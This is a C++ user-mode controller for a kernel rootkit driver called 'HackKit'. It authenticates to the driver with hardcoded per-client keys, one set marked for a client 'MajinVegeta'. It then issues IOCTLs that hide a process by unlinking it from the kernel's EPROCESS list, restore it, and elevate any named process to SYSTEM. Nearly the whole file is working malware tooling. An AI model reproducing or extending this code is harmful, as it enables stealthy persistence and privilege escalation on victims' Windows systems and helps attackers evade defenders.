// DevIoCtlTest.cpp : Defines the entry point for the console application.
//

#include <ntstatus.h>
#include <windows.h>
#include <winnt.h>
#include <stdio.h>

/*FILE_DEVICE_HACKKIT I/O*/
/*FILE_DEVICE_HACKKIT I/O*/
#define FILE_DEVICE_HACKKIT 64715
#define IOCTL_AUTHUSER CTL_CODE(FILE_DEVICE_HACKKIT, 3000, METHOD_NEITHER, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_KITBRKCONT CTL_CODE(FILE_DEVICE_HACKKIT, 2999, METHOD_NEITHER, FILE_READ_DATA|FILE_WRITE_DATA)

#define IOCTL_CURRPROCNAME CTL_CODE(FILE_DEVICE_HACKKIT, 2048, METHOD_NEITHER, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_HIDEPROC CTL_CODE(FILE_DEVICE_HACKKIT, 2049, METHOD_NEITHER, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_RESTOREPROC CTL_CODE(FILE_DEVICE_HACKKIT, 2050, METHOD_NEITHER, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_ELEVATEPROC CTL_CODE(FILE_DEVICE_HACKKIT, 2051, METHOD_NEITHER, FILE_READ_DATA|FILE_WRITE_DATA)

#ifndef _DEBUG
#define Xprintf printf
#else
#define Xprintf printf
#endif

int main(int argc, char *argv[])
{
	HANDLE hDevice = 0;
	DWORD bread = 0;

	hDevice = CreateFileA("\\\\.\\hkComm0", GENERIC_READ | GENERIC_WRITE,
		0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hDevice) {
		Xprintf("Invalid device ptr!\n");
		Xprintf("GetLastError() == %d\n", GetLastError());
		return 0;
	}
	Xprintf("Device ptr: %p\n",hDevice);

	
	Xprintf("Attempting HackKit auhtorization...\n");
	//my debug keypair
	/*ULONG uAuthKeys[2*4] = {
		0x00000000, 0x000001ef,
		0x00001449, 0x1d887fd9,
		0x00002892, 0x70f35b81,
		0x00003cdb, 0xfa4094e7};*/
	//client "MajinVegeta"
	ULONG uAuthKeys[2*4] = {
		0x0000095f, 0xd81d96cb,
		0x000008ae, 0x720b3c15,
		0x00000157, 0x33a9d5e3,
		0x000009aa, 0x781ceba9};
	NTSTATUS uAuthResult = STATUS_UNSUCCESSFUL;
	DeviceIoControl(hDevice, IOCTL_AUTHUSER, uAuthKeys, sizeof(ULONG)*2*4, &uAuthResult, 4, &bread, NULL);
	if (uAuthResult == STATUS_SUCCESS) Xprintf("\tAuthentication successful.\n");
	else { Xprintf("\tAuthentication failed.\n"); goto _Exit; }
	
	if (argc < 2) goto _InvalidCmd;

	char *command = argv[1];

	if (lstrcmpiA(command, "KITBRKCONT") == 0)
	{
		DeviceIoControl(hDevice, IOCTL_KITBRKCONT, 0, 0, 0, 0, &bread, NULL);
		Xprintf("OK.\n");
	}
	else if (lstrcmpiA(command, "CURRPROCNAME") == 0)
	{
		char procname[MAX_PATH];
		RtlZeroMemory(procname, MAX_PATH);
		DeviceIoControl(hDevice, IOCTL_CURRPROCNAME, 0, 0, procname, 16, &bread, NULL);
		Xprintf("\"%s\"\n", procname);
	}
	else if (lstrcmpiA(command, "HIDEPROC") == 0)
	{
		char *procname = argv[2];
		ULONG len = lstrlenA(procname);
		ULONG listEntry = 0;
		DeviceIoControl(hDevice, IOCTL_HIDEPROC, procname, len, &listEntry, 4, &bread, NULL);
		Xprintf("%08X\n", listEntry);
	}
	else if (lstrcmpiA(command, "RESTOREPROC") == 0)
	{
		char *listentry = argv[2];
		ULONG listEntry = 0;
		sscanf_s(listentry, "%08X", &listEntry);
		Xprintf("List Entry Addr: \"%s\" -> %08X\n", listentry, listEntry);
		DeviceIoControl(hDevice, IOCTL_RESTOREPROC, &listEntry, 4, 0, 0, &bread, NULL);
		Xprintf("OK.\n");
	}
	else if (lstrcmpiA(command, "ELEVATEPROC") == 0)
	{
		char *procname = argv[2];
		ULONG len = lstrlenA(procname);
		DeviceIoControl(hDevice, IOCTL_ELEVATEPROC, procname, len, 0, 0, &bread, NULL);
		Xprintf("OK.\n");
	}
	else
	{
_InvalidCmd:;
		Xprintf("Invalid command. Valid commands:\n");
		Xprintf("\tKITBRKCONT - continue from driver software breakpoint\n");
		Xprintf("\tCURRPROCNAME - get the current process image filename\n");
		Xprintf("\tHIDEPROC [procname] - remove eprocess from eprocesses\n");
		Xprintf("\tRESTOREPROC [addr] - restore eprocess to eprocesses\n");
		Xprintf("\tELEVATEPROC [procname] - elevate process to SYSTEM\n");
	}

_Exit:;
	CloseHandle(hDevice);
	return 0;
}
